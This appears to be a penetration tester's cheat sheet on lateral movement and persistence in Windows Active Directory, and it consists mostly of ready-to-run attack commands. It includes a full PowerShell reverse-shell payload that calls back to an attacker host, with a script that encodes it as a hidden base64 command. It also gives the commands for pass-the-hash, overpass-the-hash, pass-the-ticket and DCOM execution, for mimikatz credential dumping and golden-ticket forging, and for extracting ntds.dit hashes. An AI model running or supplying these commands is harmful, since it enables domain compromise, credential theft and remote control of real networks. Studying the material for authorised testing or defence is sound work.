# Lateral movements in AD

## Techniques

### Windows Remote Management

#### WMI

Takes a local group `Administrators` account:

##### In `cmd`

Deprecated:
```
wmic /node:$TargetIp /user:somelocalAdminuser /password:somepass process call create "cmd"
```

##### In PowerShell

```
$username = 'user';
$password = 'pass';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName $VictimIP -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e somebase64string
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command};
```

For a PowerShell reverse shell (in Python, replace the IP and Port): 
```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("AttackerIp",AttackerPort); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

#### WinRM

##### In `cmd`: WinRS (Windows Remote Shell)
 
```
winrs -r:targethostname -u:user -p:pass  "powershell -nop -w hidden -e somebase64string"
```

##### In PowerShell

```
$username = 'user';
$password = 'pass';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName $VictimIp -Credential $credential

Enter-PSSession $winrm_session_number
```

### PsExec

Pre-requisites:
- user `targetuser` needs to be part of the `Administrators` local group
- the `ADMIN$` share must be available
- `File and Printer Sharing` has to be turned on

Uses Sysinternals: https://learn.microsoft.com/en-us/sysinternals/

```
kali $ rdesktop -u $firstUser $firstTargetIp
cmd > C:\path\to\PsExec64.exe -i  \\targethostname -u targetdomain\targetuser -p somepass cmd
> hostname
> whoami
```

### Pass the Hash

Works with servers and services using NTLM authentication, but NOT with Kerberos authentication.
Impacket-Wmiexec on GitHub: https://github.com/fortra/impacket/blob/master/examples/smbclient.py
```
/usr/bin/impacket-wmiexec -hashes 00000000000000000000000000000000:somelonghashstring Administrator@$VictimIP
```

### Overpass the Hash

First, run a process as a different user with Shift-Right click, say Notepad. Then:
```
kali$ xfreerdp /cert-ignore /u:someuser /d:targetorg.com /p:somepass /v:somehostIp
PS > c:\path\to\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::pth /user:targetuser /domain:targetorg.com /ntlm:somentlmstring /run:powershell
PS2 > klist # check the cached tickets
PS2 > net use \\otherhostname
PS2 > klist # re-check the cached tickets
PS2 > cd c:\path\to\psexec
PS2 > .\PsExec.exe \\otherhostname cmd
cmd > whoami # targetuser
cmd > hostname # otherhostname
```

### Pass the Ticket

Context:
- attacker connected as user1 on host1
- user2 is connected on host2
Goal:
- steal user2's Ticket Granting Service in memory and inject it in user1's session. Then connect as user1 on host2 using user2's ticket

```
PS > whoami # user1
PS > ls \\host2\someshare # access denied
PS > c:\path\to\mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
PS > dir *.kirbi # file with the tickets
mimikatz # kerberos::ptt name_of_the_kirbi_file_with_user2_tickets.kirbi
PS > klist # lists the tickets, user2 should appear
PS > ls \\host2\someshare # access granted
```

### DCOM

In an elevated PowerShell:
```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","targetIpAddress"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc", "7") # parameters are Command, Directory, Parameters, and WindowState
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e base64longreverseshellstring", "7")
```
Reference: https://learn.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand

## Persistence

### Golden ticket

Kerberos service account: `krbtgt`
Mimikatz on GitHub:
- https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump
- https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos

Takes a Domain Admin account on the Domain Controller, or have compromised the Domain Controller:
```
SomeWorkstation c:\path\to\sysinternalsuite > .\PsExec64.exe \\TargetDomainController cmd.exe # access denied

DomainController c:\path\to\mimikatz > .\mimikatz.exe # on the Domain Controller, with a Domain Admin account
DC mimikatz # privilege::debug
DC mimikatz # lsadump::lsa /patch # search for the krbtgt service NTLM hash, and get the domain SID: S-1-5-21-x-y-z

SomeWorkstation c:\path\to\mimikatz > mimikatz.exe # on a workstation, with a random user account
SomeWorkstation mimikatz # kerberos::purge
SomeWorkstation mimikatz # kerberos::golden /user:targetrandomuser /domain:somedomainname.com /sid:S-1-5-21-x-y-z /krbtgt:NtlmHash /ptt
SomeWorkstation mimikatz # misc::cmd

SomeWorkstation c:\path\to\sysinternalsuite > .\PsExec64.exe \\TargetDomainController cmd.exe # access granted on the Domain Controller
DomainController c:\any\path > ipconfig
c:\any\path > whoami # targetrandomuser
c:\any\path > whoami /groups # expected "somedomainname\Domain Admins"

SomeWorkstation c:\path\to\sysinternalsuite > .\PsExec64.exe \\TargetDomainControllerIpAddress cmd.exe # access denied, the IP address triggers an NTLM authentication
```

Reference: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf

### Shawdow copies

Connect as a Domain Admin on the Domain Controller.
Impacke-SecretDump on GitHub: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
```
c:\path\to\vshadow > .\vshadow.exe -nw -p c: # take note of the "Shadow copy device name"
> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\windows\ntds\ntds.dit c:\ntds.dit.bak
> reg.exe save hklm\system c:\system.bak

kali $ impacket-secretdump -ntds ntds.dit.bak -system system.bak LOCAL
```
Hashes can be cracked or used for PtH attacks.
